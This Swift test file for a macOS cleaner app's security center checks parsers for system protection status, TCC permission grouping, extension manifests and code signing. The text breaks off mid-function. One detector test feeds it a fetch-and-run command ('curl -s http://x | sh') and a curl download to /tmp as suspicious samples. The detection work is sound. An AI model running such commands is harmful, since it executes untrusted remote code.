//
//  SecurityTests.swift
//  MacCleanTests
//
//  安全中心：系统防护命令输出解析、TCC 分组、可疑项启发式规则、扩展清单解析、代码签名检查。
//

import AppKit
import Foundation
import SQLite3
import SwiftUI
import Testing
@testable import MacClean

struct SecurityTests {

    // MARK: - 系统防护解析

    @Test func fileVaultStates() {
        #expect(ProtectionParsers.fileVault("FileVault is On.\n") == .on)
        #expect(ProtectionParsers.fileVault("FileVault is Off.") == .off)
        #expect(ProtectionParsers.fileVault("Encryption in progress: Percent completed = 12.5") == .encrypting)
        #expect(ProtectionParsers.fileVault("FileVault is On.\nDecryption in progress: Percent completed = 40") == .decrypting)
        #expect(ProtectionParsers.fileVault("") == .unknown)
        #expect(ProtectionEvaluator.fileVault(.off).health == .attention)
        #expect(ProtectionEvaluator.fileVault(.encrypting).health == .good)
    }

    @Test func firewallStates() {
        #expect(ProtectionParsers.firewall("Firewall is disabled. (State = 0)") == .off)
        #expect(ProtectionParsers.firewall("Firewall is enabled. (State = 1)") == .on)
        #expect(ProtectionParsers.firewall("Firewall is blocking all non-essential incoming connections. (State = 2)") == .blockAll)
        #expect(ProtectionParsers.firewall("garbage") == .unknown)
        #expect(ProtectionParsers.stealthMode("Firewall stealth mode is off") == false)
        #expect(ProtectionParsers.stealthMode("Firewall stealth mode is on") == true)
        #expect(ProtectionParsers.stealthMode("") == nil)
        #expect(ProtectionEvaluator.firewall(.off, stealth: false).health == .attention)
        #expect(ProtectionEvaluator.firewall(.blockAll, stealth: nil).health == .good)
    }

    @Test func sipAndGatekeeper() {
        #expect(ProtectionParsers.sip("System Integrity Protection status: enabled.") == .enabled)
        #expect(ProtectionParsers.sip("System Integrity Protection status: disabled.") == .disabled)
        #expect(ProtectionParsers.sip("System Integrity Protection status: unknown (Custom Configuration).\n\nConfiguration:\n\tKext Signing: disabled") == .custom)
        #expect(ProtectionParsers.sip("csrutil: command not found") == .unknown)
        #expect(ProtectionParsers.gatekeeper("assessments enabled\n") == .enabled)
        #expect(ProtectionParsers.gatekeeper("assessments disabled") == .disabled)
        #expect(ProtectionParsers.gatekeeper("") == .unknown)
        // SIP / Gatekeeper 无法在系统设置中修改：给出文字说明，没有深链接
        #expect(ProtectionCheck.Kind.sip.settingsURLs.isEmpty)
        #expect(ProtectionEvaluator.gatekeeper(.disabled).advice?.contains("spctl --master-enable") == true)
    }

    @Test func screenLockParsing() {
        let prefix = "2026-10-02 08:00:28.624 sysadminctl[38368:19488711] "
        #expect(ProtectionParsers.screenLock(prefix + "screenLock delay is 900 seconds") == .delay(900))
        #expect(ProtectionParsers.screenLock(prefix + "screenLock is off") == .off)
        #expect(ProtectionParsers.screenLock(prefix + "screenLock delay is immediate") == .immediate)
        #expect(ProtectionParsers.screenLock(prefix + "screenLock delay is 0 seconds") == .immediate)
        #expect(ProtectionParsers.screenLock("") == .unknown)
        #expect(!ProtectionParsers.screenLockNeedsAttention(.delay(900)))
        #expect(!ProtectionParsers.screenLockNeedsAttention(.delay(3600)))
        #expect(ProtectionParsers.screenLockNeedsAttention(.delay(14400)))
        #expect(ProtectionParsers.screenLockNeedsAttention(.off))
        #expect(ProtectionEvaluator.screenLock(.delay(14400)).health == .attention)
    }

    @Test func softwareUpdateDefaults() throws {
        let allOn = """
        {
            AutomaticDownload = 1;
            AutomaticallyInstallMacOSUpdates = 1;
            ConfigDataInstall = 1;
            CriticalUpdateInstall = 1;
            LastUpdatesAvailable = 1;
            RecommendedUpdates = ( { "Display Name" = "macOS"; } );
        }
        """
        let settings = try #require(ProtectionParsers.softwareUpdate(allOn))
        #expect(settings.automaticCheck)          // 键缺失 = 默认开启
        #expect(settings.criticalUpdateInstall && settings.configDataInstall && settings.automaticallyInstallMacOS)
        #expect(ProtectionEvaluator.autoUpdates(settings).health == .good)

        let off = try #require(ProtectionParsers.softwareUpdate("{ CriticalUpdateInstall = 0; ConfigDataInstall = 0; }"))
        #expect(!off.criticalUpdateInstall && !off.configDataInstall)
        #expect(ProtectionEvaluator.autoUpdates(off).health == .attention)

        let missing = ProtectionParsers.softwareUpdate("Domain /Library/Preferences/com.apple.SoftwareUpdate does not exist")
        #expect(missing == SoftwareUpdateSettings())
        #expect(ProtectionParsers.softwareUpdate("not a plist {{{") == nil)
        #expect(ProtectionEvaluator.autoUpdates(nil).health == .unknown)
    }

    @Test func netstatListeningPorts() {
        let output = """
        Active Internet connections (including servers)
        Proto Recv-Q Send-Q  Local Address          Foreign Address        (state)          rxbytes      txbytes
        tcp4       0      0  192.168.18.117.61474   23.254.199.219.22392   ESTABLISHED        14592         2034
        tcp4       0      0  *.22                   *.*                    LISTEN                 0            0
        tcp6       0      0  *.5900                 *.*                    LISTEN                 0            0
        tcp4       0      0  127.0.0.1.445          *.*                    LISTEN                 0            0
        tcp6       0      0  ::1.548                *.*                    LISTEN                 0            0
        tcp46      0      0  *.62154                *.*                    LISTEN                 0            0
        tcp4       0      0  192.168.1.5.3283       *.*                    LISTEN                 0            0
        tcp4       0      0  10.0.0.2.548           10.0.0.9.50000         ESTABLISHED            0            0
        """
        let ports = ProtectionParsers.listeningPorts(output)
        #expect(ports == [22, 5900, 62154, 3283])
        let services = ProtectionParsers.remoteServices(listening: ports).map(\.port)
        #expect(services == [22, 5900, 3283])
        #expect(ProtectionEvaluator.remoteAccess([]).health == .good)
        #expect(ProtectionEvaluator.remoteAccess(RemoteService.all.filter { $0.port == 22 }).health == .attention)
        #expect(ProtectionEvaluator.remoteAccess(nil).health == .unknown)
    }

    @Test func xprotectStalenessRule() {
        let now = Date(timeIntervalSince1970: 1_790_000_000)
        #expect(!ProtectionParsers.xprotectIsStale(updated: now.addingTimeInterval(-10 * 86_400), now: now))
        #expect(!ProtectionParsers.xprotectIsStale(updated: now.addingTimeInterval(-60 * 86_400 + 60), now: now))
        #expect(ProtectionParsers.xprotectIsStale(updated: now.addingTimeInterval(-61 * 86_400), now: now))

        let old = XProtectInfo(version: "5300", updated: now.addingTimeInterval(-90 * 86_400), path: "/a")
        let new = XProtectInfo(version: "5363", updated: now.addingTimeInterval(-3 * 86_400), path: "/b")
        #expect(XProtectLocator.pickNewest([old, new]) == new)
        #expect(ProtectionEvaluator.xprotect(old, now: now).health == .attention)
        #expect(ProtectionEvaluator.xprotect(new, now: now).health == .good)
        #expect(ProtectionEvaluator.xprotect(nil, now: now).health == .unknown)
    }

    @Test func xprotectReadsBundlesFromDisk() throws {
        let root = FileManager.default.temporaryDirectory.appendingPathComponent("xp-\(UUID().uuidString)")
        defer { try? FileManager.default.removeItem(at: root) }
        for (name, version) in [("A", "5200"), ("B", "5363")] {
            let contents = root.appendingPathComponent("\(name)/XProtect.bundle/Contents")
            try FileManager.default.createDirectory(at: contents, withIntermediateDirectories: true)
            let plist = try PropertyListSerialization.data(fromPropertyList: ["CFBundleShortVersionString": version], format: .xml, options: 0)
            try plist.write(to: contents.appendingPathComponent("Info.plist"))
        }
        let info = try #require(XProtectLocator.newest(paths: [
            root.appendingPathComponent("A/XProtect.bundle").path,
            root.appendingPathComponent("B/XProtect.bundle").path,
            "/nonexistent/XProtect.bundle",
        ]))
        #expect(info.version == "5363")
    }

    // MARK: - TCC

    /// 在临时目录建一个与系统相同 access 表结构的数据库
    private func makeTCCDatabase(rows: [(String, String, Int, Int, String)]) throws -> URL {
        let url = FileManager.default.temporaryDirectory.appendingPathComponent("tcc-\(UUID().uuidString).db")
        var db: OpaquePointer?
        try #require(sqlite3_open(url.path, &db) == SQLITE_OK)
        defer { sqlite3_close(db) }
        let schema = """
        CREATE TABLE access (service TEXT NOT NULL, client TEXT NOT NULL, client_type INTEGER NOT NULL, auth_value INTEGER NOT NULL,
        auth_reason INTEGER NOT NULL, auth_version INTEGER NOT NULL, csreq BLOB, policy_id INTEGER, indirect_object_identifier_type INTEGER,
        indirect_object_identifier TEXT NOT NULL DEFAULT 'UNUSED', indirect_object_code_identity BLOB, flags INTEGER,
        last_modified INTEGER NOT NULL DEFAULT (CAST(strftime('%s','now') AS INTEGER)), pid INTEGER, pid_version INTEGER,
        boot_uuid TEXT NOT NULL DEFAULT 'UNUSED', last_reminded INTEGER NOT NULL DEFAULT 0,
        PRIMARY KEY (service, client, client_type, indirect_object_identifier));
        """
        try #require(sqlite3_exec(db, schema, nil, nil, nil) == SQLITE_OK)
        for (service, client, type, auth, indirect) in rows {
            let sql = "INSERT INTO access (service, client, client_type, auth_value, auth_reason, auth_version, indirect_object_identifier, last_modified) VALUES ('\(service)', '\(client)', \(type), \(auth), 2, 1, '\(indirect)', 1700000000)"
            try #require(sqlite3_exec(db, sql, nil, nil, nil) == SQLITE_OK)
        }
        return url
    }

    @Test func tccReadAndGroup() throws {
        let url = try makeTCCDatabase(rows: [
            ("kTCCServiceCamera", "us.zoom.xos", 0, 2, "UNUSED"),
            ("kTCCServiceCamera", "com.gone.app", 0, 2, "UNUSED"),
            ("kTCCServiceCamera", "com.denied.app", 0, 0, "UNUSED"),
            ("kTCCServiceCamera", "com.apple.FaceTime", 0, 2, "UNUSED"),
            ("kTCCServiceMicrophone", "us.zoom.xos", 0, 2, "UNUSED"),
            ("kTCCServiceAppleEvents", "com.tool.automator", 0, 2, "com.apple.finder"),
            ("kTCCServiceAppleEvents", "com.tool.automator", 0, 2, "com.apple.systemevents"),
            ("kTCCServiceSystemPolicyDesktopFolder", "/usr/local/bin/mytool", 1, 2, "UNUSED"),
            ("kTCCServiceSystemPolicyDownloadsFolder", "/usr/local/bin/mytool", 1, 3, "UNUSED"),
            ("kTCCServiceLiverpool", "com.apple.syncdefaultsd", 0, 2, "UNUSED"),
            ("kTCCServiceAccessibility", "/usr/bin/osascript", 1, 2, "UNUSED"),
        ])
        defer { try? FileManager.default.removeItem(at: url) }

        let rows = try #require(TCCDatabase.allowedRows(at: url.path))
        #expect(rows.count == 10)    // 拒绝的那条不读
        #expect(rows.first { $0.service == "kTCCServiceAppleEvents" }?.indirectObject != nil)
        #expect(rows.first { $0.service == "kTCCServiceCamera" }?.lastModified == Date(timeIntervalSince1970: 1_700_000_000))

        let existing: [String: PermissionClientInfo] = [
            "us.zoom.xos": PermissionClientInfo(displayName: "zoom.us", path: "/Applications/zoom.us.app"),
            "com.tool.automator": PermissionClientInfo(displayName: "Automator Tool", path: "/Applications/Tool.app"),
            "/usr/local/bin/mytool": PermissionClientInfo(displayName: "mytool", path: "/usr/local/bin/mytool"),
            "com.apple.FaceTime": PermissionClientInfo(displayName: "FaceTime", path: "/System/Applications/FaceTime.app"),
            "/usr/bin/osascript": PermissionClientInfo(displayName: "osascript", path: "/usr/bin/osascript"),
            "com.apple.finder": PermissionClientInfo(displayName: "Finder", path: "/System/Library/CoreServices/Finder.app"),
        ]
        var signatureChecks: [String] = []
        let groups = PermissionGrouping.group(
            rows: rows,
            resolve: { client, _ in existing[client] ?? PermissionClientInfo(displayName: client, path: nil) },
            signature: { path in
                signatureChecks.append(path)
                return path == "/usr/local/bin/mytool" ? SignatureInfo(validity: .unsigned) : SignatureInfo(validity: .valid, teamID: "TEAM")
            }
        )

        #expect(groups.map(\.service) == [.camera, .microphone, .accessibility, .automation, .filesAndFolders])
        let camera = try #require(groups.first { $0.service == .camera })
        // 失效的排在最后、单独计数，不算值得留意；Apple 的折叠
        #expect(camera.clients.map(\.client) == ["us.zoom.xos", "com.gone.app"])
        #expect(camera.clients.last?.isMissing == true)
        #expect(camera.appleClients.map(\.client) == ["com.apple.FaceTime"])
        #expect(camera.attentionCount == 0)
        #expect(camera.staleCount == 1)

        let automation = try #require(groups.first { $0.service == .automation })
        #expect(automation.clients.count == 1)
        #expect(Set(automation.clients[0].details) == ["Finder", "com.apple.systemevents"])

        let files = try #require(groups.first { $0.service == .filesAndFolders })
        #expect(files.clients.count == 1)
        #expect(files.clients[0].details.count == 2)
        #expect(files.clients[0].isLimited)
        #expect(files.clients[0].signatureProblem != nil)

        let accessibility = try #require(groups.first { $0.service == .accessibility })
        #expect(accessibility.clients.isEmpty && accessibility.appleClients.count == 1)

        // Apple 组件不做签名检查；同一路径只检查一次
        #expect(!signatureChecks.contains { $0.hasPrefix("/System/") || $0 == "/usr/bin/osascript" })
        #expect(signatureChecks.filter { $0 == "/usr/local/bin/mytool" }.count == 1)

        let report = PermissionsReport(needsFullDiskAccess: false, isPartial: false, groups: groups)
        #expect(report.attentionClients.map(\.client) == ["/usr/local/bin/mytool"])
        #expect(report.staleClientCount == 1)
        #expect(report.thirdPartyClientCount == 3)   // zoom、automator、mytool
    }

    @Test func tccUnreadableDatabaseNeedsFullDiskAccess() {
        let report = AppPermissionsScanner.scan(userDB: "/nonexistent/TCC.db", systemDB: "/nonexistent2/TCC.db")
        #expect(report.needsFullDiskAccess)
        #expect(report.groups.isEmpty)
    }

    @Test func appleClientDetection() {
        #expect(PermissionGrouping.isAppleClient("com.apple.Terminal", isPath: false))
        #expect(!PermissionGrouping.isAppleClient("com.applesauce.app", isPath: false))
        #expect(PermissionGrouping.isAppleClient("/usr/libexec/sshd-keygen-wrapper", isPath: true))
        #expect(!PermissionGrouping.isAppleClient("/opt/homebrew/bin/python3", isPath: true))
    }

    // MARK: - 可疑项启发式

    @Test func suspiciousPathHeuristics() {
        #expect(SuspicionRules.isInHiddenDirectory("/Users/me/Library/.hidden/agent"))
        #expect(SuspicionRules.isInHiddenDirectory("/Users/me/.local/bin/x"))
        #expect(!SuspicionRules.isInHiddenDirectory("/Applications/Foo.app/Contents/MacOS/Foo"))
        #expect(SuspicionRules.isInTempLocation("/tmp/x"))
        #expect(SuspicionRules.isInTempLocation("/private/tmp/x"))
        #expect(SuspicionRules.isInTempLocation("/Users/Shared/updater"))
        #expect(!SuspicionRules.isInTempLocation("/Users/me/tmp/x"))

        #expect(SuspicionRules.looksRandom("aB3x9Kq2Lm"))
        #expect(SuspicionRules.looksRandom("3f9a2b7c1d4e5f60"))
        #expect(SuspicionRules.looksRandom("E621E1F8-C36C-495A-93FC-0C247A3E6E5F"))
        #expect(SuspicionRules.looksRandom("xkqzvbtrwp"))
        #expect(!SuspicionRules.looksRandom("GoogleUpdater"))
        #expect(!SuspicionRules.looksRandom("Dropbox"))
        #expect(!SuspicionRules.looksRandom("com.adobe.ARMDCHelper"))
        #expect(!SuspicionRules.looksRandom("Office365"))
        let home = "/Users/me"
        #expect(SuspicionRules.hasRandomNameInApplicationSupport("/Users/me/Library/Application Support/x7Hk2pQ9zR/run", home: home))
        #expect(!SuspicionRules.hasRandomNameInApplicationSupport("/Users/me/Library/Application Support/Zoom/updater", home: home))
    }

    @Test func fakeAppleLabel() {
        #expect(SuspicionRules.imitatesApple(label: "com.apple.updater", executable: "/Users/me/Library/upd", isAppleSigned: false))
        #expect(!SuspicionRules.imitatesApple(label: "com.apple.updater", executable: "/usr/libexec/upd", isAppleSigned: false))
        #expect(!SuspicionRules.imitatesApple(label: "com.apple.xcode.helper", executable: "/Applications/Xcode.app/Contents/x", isAppleSigned: true))
        #expect(!SuspicionRules.imitatesApple(label: "com.google.keystone", executable: "/Users/me/x", isAppleSigned: false))
    }

    @Test func shellOneLiners() {
        #expect(SuspicionRules.inlineInterpreter(["/bin/sh", "-c", "curl -s http://x | sh"]) == "sh")
        #expect(SuspicionRules.inlineInterpreter(["/bin/zsh", "-lc", "echo hi"]) == "zsh")
        #expect(SuspicionRules.inlineInterpreter(["/usr/bin/osascript", "-e", "do shell script \"x\""]) == "osascript")
        #expect(SuspicionRules.inlineInterpreter(["/usr/bin/env", "python3", "-c", "import os"]) == "python3")
        #expect(SuspicionRules.inlineInterpreter(["/usr/bin/curl", "-o", "/tmp/x", "http://x"]) == "curl")
        #expect(SuspicionRules.inlineInterpreter(["/opt/homebrew/bin/python3.12", "-c", "x"]) == "python3.12")
        #expect(SuspicionRules.inlineInterpreter(["/bin/bash", "/Users/me/scripts/backup.sh"]) == nil)
        #expect(SuspicionRules.inlineInterpreter(["/Applications/Foo.app/Contents/MacOS/Foo", "-c", "x"]) == nil)
        #expect(SuspicionRules.inlineInterpreter([]) == nil)

        let plist = try! PropertyListSerialization.data(fromPropertyList: [
            "Label": "x", "ProgramArguments": ["/bin/sh", "-c", "echo"],
        ], format: .xml, options: 0)
        #expect(SuspicionRules.programArguments(plistData: plist) == ["/bin/sh", "-c", "echo"])
    }

    @Test func findingReasonsCombine() {
        let home = "/Users/me"
        let unsigned = SuspicionRules.reasons(label: "com.x.agent", executable: "/Users/me/.cache/agent", arguments: ["/Users/me/.cache/agent"],
                                              signature: SignatureInfo(validity: .unsigned), home: home)
        #expect(unsigned == [.unsigned, .hiddenDirectory])

        let brew = SuspicionRules.reasons(label: "homebrew.mxcl.redis", executable: "/opt/homebrew/opt/redis/bin/redis-server", arguments: [],
                                          signature: SignatureInfo(validity: .valid, isAdhoc: true), home: home)
        #expect(brew == [.adhocPackageManager])
        #expect(brew.map(\.severity).max() == .info)

        let notarizedApp = SuspicionRules.reasons(label: "com.vendor.helper", executable: "/Library/Application Support/Vendor/helper", arguments: [],
                                                  signature: SignatureInfo(validity: .valid, teamID: "T", isNotarized: true), home: home)
        #expect(notarizedApp.isEmpty)

        let notNotarized = SuspicionRules.reasons(label: "com.vendor.helper", executable: "/Library/Application Support/Vendor/helper", arguments: [],
                                                  signature: SignatureInfo(validity: .valid, teamID: "T"), home: home)
        #expect(notNotarized == [.notNotarized])

        let inApplications = SuspicionRules.reasons(label: "com.vendor.helper", executable: "/Applications/V.app/Contents/MacOS/h", arguments: [],
                                                     signature: SignatureInfo(validity: .valid, teamID: "T"), home: home)
        #expect(inApplications.isEmpty)

        let adhocApp = SuspicionRules.signatureReasons(SignatureInfo(validity: .valid, isAdhoc: true), path: "/Applications/Indie.app", checkNotarization: false, isApp: true)
        #expect(adhocApp == [.adhocApp])
        #expect(FindingReason.adhocApp.severity == .info)
        #expect(FindingReason.revoked.severity == .attention)
    }

    @Test func severityAndScripts() throws {
        let notarized = SignatureInfo(validity: .valid, teamID: "T", isNotarized: true)
        #expect(SuspicionRules.severity(of: [.hiddenDirectory], signature: notarized) == .info)
        #expect(SuspicionRules.severity(of: [.hiddenDirectory], signature: SignatureInfo(validity: .unsigned)) == .attention)
        #expect(SuspicionRules.severity(of: [.hiddenDirectory], signature: nil) == .attention)
        #expect(SuspicionRules.severity(of: [.tempLocation], signature: notarized) == .attention)
        #expect(SuspicionRules.severity(of: [.scriptFile], signature: nil) == .info)

        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("script-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: dir) }
        let script = dir.appendingPathComponent("launch.sh")
        try "#!/bin/sh\nexec /usr/bin/true\n".write(to: script, atomically: true, encoding: .utf8)
        #expect(SuspicionRules.isScript(atPath: script.path))
        #expect(!SuspicionRules.isScript(atPath: "/bin/ls"))
        let reasons = SuspicionRules.reasons(label: "com.zerotier.one", executable: "/Library/Application Support/ZeroTier/launch.sh",
                                             arguments: [], signature: nil, isScript: true, home: "/Users/me")
        #expect(reasons == [.scriptFile])

        // 只有 plist 的 BTM 条目不做签名检查；用户启动代理里的可疑项会被找出
        let item = LaunchItem(id: "/x.plist", kind: .userAgent, label: "com.apple.fake", plistPath: nil,
                              executablePath: script.path, runAtLoad: true, keepAlive: false, isBroken: false,
                              isDisabled: false, isBlockedInSettings: false, isRunning: false, appPath: nil, appName: nil, developer: nil)
        let findings = SuspiciousItemsScanner.checkLaunchItems([item], home: "/Users/me")
        #expect(findings.count == 1)
        #expect(findings.first?.reasons.contains(.fakeAppleLabel) == true)
        #expect(findings.first?.reasons.contains(.scriptFile) == true)
        #expect(findings.first?.severity == .attention)
    }

    // MARK: - 描述文件 / Safari / 浏览器扩展

    @Test func profilesOutput() {
        let none = ProfilesParser.parse("There are no configuration profiles installed for user 'wangwei'\n")
        #expect(none.profiles.isEmpty && !none.couldNotCheck)

        let some = ProfilesParser.parse("""
        wangwei[1] attribute: profileIdentifier: com.example.vpn
        _computerlevel[1] attribute: profileIdentifier: com.corp.mdm
        There are 2 configuration profiles installed
        """)
        #expect(some.profiles.map(\.identifier) == ["com.example.vpn", "com.corp.mdm"])
        #expect(some.profiles.map(\.isComputerLevel) == [false, true])

        #expect(ProfilesParser.parse("").couldNotCheck)
    }

    @Test func safariPluginkitOutput() {
        #expect(BrowserExtensionParser.safariExtensions(pluginkitOutput: "  (no matches)\n").isEmpty)
        let output = """
        +    com.example.Blocker.Extension(1.2)
                    Path = /Applications/Blocker.app/Contents/PlugIns/Blocker Extension.appex
                    UUID = 1234
                     SDK = com.apple.Safari.web-extension
           Parent Bundle = /Applications/Blocker.app
            Display Name = Blocker Extension
             Parent Name = Blocker
             com.other.ext(2.0)
            Display Name = Other
        """
        let extensions = BrowserExtensionParser.safariExtensions(pluginkitOutput: output)
        #expect(extensions.map(\.identifier) == ["com.example.Blocker.Extension", "com.other.ext"])
        #expect(extensions.map(\.name) == ["Blocker Extension", "Other"])
        #expect(extensions.first?.version == "1.2")
        #expect(extensions.first?.path == "/Applications/Blocker.app")
    }

    @Test func manifestNameResolution() throws {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("ext-\(UUID().uuidString)")
        defer { try? FileManager.default.removeItem(at: dir) }
        let locales = dir.appendingPathComponent("_locales/zh_CN")
        try FileManager.default.createDirectory(at: locales, withIntermediateDirectories: true)
        try #"{"AppName": {"message": "翻译助手"}}"#.data(using: .utf8)!.write(to: locales.appendingPathComponent("messages.json"))

        let manifest: [String: Any] = ["name": "__MSG_appName__", "default_locale": "zh_CN", "version": "1.0"]
        #expect(BrowserExtensionParser.extensionName(manifest: manifest, directory: dir.path, fallback: "id") == "翻译助手")
        #expect(BrowserExtensionParser.extensionName(manifest: ["name": "Plain"], directory: dir.path, fallback: "id") == "Plain")
        #expect(BrowserExtensionParser.extensionName(manifest: ["name": "__MSG_missing__", "short_name": "Short"], directory: dir.path, fallback: "id") == "Short")
        #expect(BrowserExtensionParser.extensionName(manifest: ["name": "__MSG_missing__"], directory: dir.path, fallback: "abc") == "abc")
    }

    @Test func extensionPermissionBreadth() {
        let broad = BrowserExtensionParser.permissions(manifest: [
            "permissions": ["storage", "webRequest"],
            "host_permissions": ["<all_urls>"],
        ])
        #expect(BrowserExtensionParser.hasBroadPermissions(broad))
        let contentScript = BrowserExtensionParser.permissions(manifest: [
            "permissions": ["proxy"],
            "content_scripts": [["matches": ["*://*/*"]]],
        ])
        #expect(BrowserExtensionParser.hasBroadPermissions(contentScript))
        #expect(!BrowserExtensionParser.hasBroadPermissions(["<all_urls>", "storage"]))
        #expect(!BrowserExtensionParser.hasBroadPermissions(["webRequest", "https://example.com/*"]))
        #expect(BrowserExtensionParser.isChromiumExtensionID("aapbdbdomjkkjkaonfhkkikfgjllcleb"))
        #expect(!BrowserExtensionParser.isChromiumExtensionID("Temp"))
    }

    @Test func chromiumProfilesAndFirefox() throws {
        let root = FileManager.default.temporaryDirectory.appendingPathComponent("chrome-\(UUID().uuidString)")
        defer { try? FileManager.default.removeItem(at: root) }
        let id = "abcdefghijklmnopabcdefghijklmnop"
        for version in ["1.9_0", "1.10_0"] {
            let dir = root.appendingPathComponent("Profile 1/Extensions/\(id)/\(version)")
            try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
            let manifest: [String: Any] = ["name": "Ext \(version)", "version": version, "permissions": ["nativeMessaging", "<all_urls>"]]
            try JSONSerialization.data(withJSONObject: manifest).write(to: dir.appendingPathComponent("manifest.json"))
        }
        try #"{"profile": {"info_cache": {"Profile 1": {"name": "Work"}}}}"#.data(using: .utf8)!.write(to: root.appendingPathComponent("Local State"))

        let found = BrowserExtensionScanner.chromiumExtensions(browser: "Chrome", root: root.path)
        #expect(found.count == 1)
        #expect(found.first?.name == "Ext 1.10_0")      // 取版本号最大的目录
        #expect(found.first?.profile == "Work")
        #expect(found.first?.hasBroadPermissions == true)

        let firefox = """
        {"addons": [
          {"id": "ublock@x", "type": "extension", "version": "1.5", "active": true, "location": "app-profile",
           "defaultLocale": {"name": "uBlock Origin"}, "userPermissions": {"permissions": ["webRequest"], "origins": ["<all_urls>"]}},
          {"id": "builtin@mozilla", "type": "extension", "location": "app-builtin", "defaultLocale": {"name": "Builtin"}},
          {"id": "theme@x", "type": "theme", "location": "app-profile"}
        ]}
        """
        let addons = BrowserExtensionParser.firefoxExtensions(firefox.data(using: .utf8)!, profile: "default")
        #expect(addons.map(\.name) == ["uBlock Origin"])
        #expect(addons.first?.hasBroadPermissions == true)
    }

    // MARK: - 代码签名

    @Test func signatureOfAppleBinary() {
        let info = CodeSignatureInspector.inspect(path: "/bin/ls")
        #expect(info.validity == .valid)
        #expect(info.isApple)
        #expect(!info.isAdhoc)
    }

    @Test func signatureOfSafari() {
        guard FileManager.default.fileExists(atPath: "/Applications/Safari.app") else { return }
        let info = CodeSignatureInspector.inspect(path: "/Applications/Safari.app", validateResources: false)
        #expect(info.validity == .valid)
        #expect(info.isApple)
    }

    @Test func signatureOfUnsignedScriptAndModifiedBinary() throws {
        let dir = FileManager.default.temporaryDirectory.appendingPathComponent("sig-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: dir) }

        let script = dir.appendingPathComponent("hello.sh")
        try "#!/bin/sh\necho hi\n".write(to: script, atomically: true, encoding: .utf8)
        #expect(CodeSignatureInspector.inspect(path: script.path).validity == .unsigned)

        // 复制 Apple 签名的二进制再改几个字节：签名仍在但校验失败
        let copy = dir.appendingPathComponent("ls-copy")
        var data = try Data(contentsOf: URL(fileURLWithPath: "/bin/ls"))
        let index = data.count / 2
        data[index] = data[index] ^ 0xFF
        try data.write(to: copy)
        let info = CodeSignatureInspector.inspect(path: copy.path)
        if case .invalid = info.validity {} else { Issue.record("expected invalid, got \(info.validity)") }

        // 临时签名
        let adhoc = dir.appendingPathComponent("adhoc-tool")
        try FileManager.default.copyItem(at: URL(fileURLWithPath: "/bin/ls"), to: adhoc)
        let result = MaintenanceRunner.runProcess("/usr/bin/codesign", ["--force", "--sign", "-", adhoc.path])
        if result.status == 0 {
            let adhocInfo = CodeSignatureInspector.inspect(path: adhoc.path)
            #expect(adhocInfo.validity == .valid)
            #expect(adhocInfo.isAdhoc)
            #expect(!adhocInfo.isApple)
        }

        #expect(CodeSignatureInspector.inspect(path: dir.appendingPathComponent("missing").path).validity == .unreadable)
    }

    // MARK: - 本机实测（只读；打印结果供人工核对）

    @Test func realMachineScan() async throws {
        guard ProcessInfo.processInfo.environment["MACCLEAN_SECURITY_LIVE"] == "1" else { return }
        let start = Date()
        let checks = await Task.detached { SystemProtectionScanner.scan() }.value
        for check in checks {
            print("[protection] \(check.kind.rawValue): \(check.health) | \(check.state) | \(check.detail ?? "-") | \(check.advice ?? "-")")
        }
        print("[timing] protection \(Date().timeIntervalSince(start))s")

        let t1 = Date()
        let permissions = await Task.detached { AppPermissionsScanner.scan() }.value
        print("[permissions] needsFDA=\(permissions.needsFullDiskAccess) partial=\(permissions.isPartial) thirdParty=\(permissions.thirdPartyClientCount)")
        for group in permissions.groups {
            let flagged = group.clients.filter(\.needsAttention).map { "\($0.displayName)[\($0.isMissing ? "missing" : ($0.signatureProblem ?? ""))]" }
            print("[permissions] \(group.service.rawValue): \(group.clients.count) third-party, \(group.appleClients.count) apple; flagged: \(flagged)")
        }
        print("[timing] permissions \(Date().timeIntervalSince(t1))s")

        let t2 = Date()
        let suspicious = await Task.detached { SuspiciousItemsScanner.scan() }.value
        print("[suspicious] launchItems=\(suspicious.launchItemCount) apps=\(suspicious.appCount) profiles=\(suspicious.profiles)")
        for finding in suspicious.persistence {
            print("[persistence] \(finding.severity) \(finding.item.label) \(finding.executable ?? "-") \(finding.reasons)")
        }
        for app in suspicious.apps { print("[app] \(app.severity) \(app.name) \(app.reasons)") }
        print("[timing] suspicious \(Date().timeIntervalSince(t2))s, revocation candidates \(suspicious.revocationCandidates.count)")

        let t3 = Date()
        let revocation = await Task.detached { CodeSignatureInspector.revocationStatuses(paths: suspicious.revocationCandidates) }.value
        print("[revocation] completed=\(revocation.completed) checked=\(revocation.results.count) revoked=\(revocation.results.filter(\.value).map(\.key))")
        print("[timing] revocation \(Date().timeIntervalSince(t3))s")

        let extensions = await Task.detached { BrowserExtensionScanner.scan() }.value
        for ext in extensions { print("[extension] \(ext.browser)/\(ext.profile ?? "-") \(ext.name) \(ext.version ?? "") broad=\(ext.hasBroadPermissions)") }
    }
}

// MARK: - 结果页截图（真实只读扫描；设置 MACCLEAN_SNAPSHOT_DIR 且 MACCLEAN_SECURITY_SNAPSHOT=1 时运行）

@MainActor
struct SecuritySnapshotTests {
    @Test func renderScannedSections() async throws {
        let env = ProcessInfo.processInfo.environment
        guard let dir = env["MACCLEAN_SNAPSHOT_DIR"], env["MACCLEAN_SECURITY_SNAPSHOT"] == "1" else { return }
        let outDir = URL(fileURLWithPath: dir)
        try FileManager.default.createDirectory(at: outDir, withIntermediateDirectories: true)

        let viewModel = SecurityCenterViewModel.shared
        let start = Date()
        var scannedAt: Date?
        viewModel.scan()
        for _ in 0..<240 {
            try await Task.sleep(for: .milliseconds(250))
            if viewModel.hasScanned, !viewModel.isScanning {
                if scannedAt == nil { scannedAt = Date() }
                if case .checking = viewModel.revocation { continue }
                if viewModel.revocation != .idle { break }
            }
        }
        print("[timing] in-app scan \(scannedAt.map { $0.timeIntervalSince(start) } ?? -1)s, with revocation \(Date().timeIntervalSince(start))s")

        let height = Int(env["MACCLEAN_SECURITY_SNAPSHOT_HEIGHT"] ?? "") ?? 1400
        AppState.shared.currentTab = .security
        for (mode, appearance) in [("dark", NSAppearance.Name.darkAqua), ("light", .aqua)] {
            for section in SecurityCenterViewModel.Section.allCases {
                viewModel.section = section
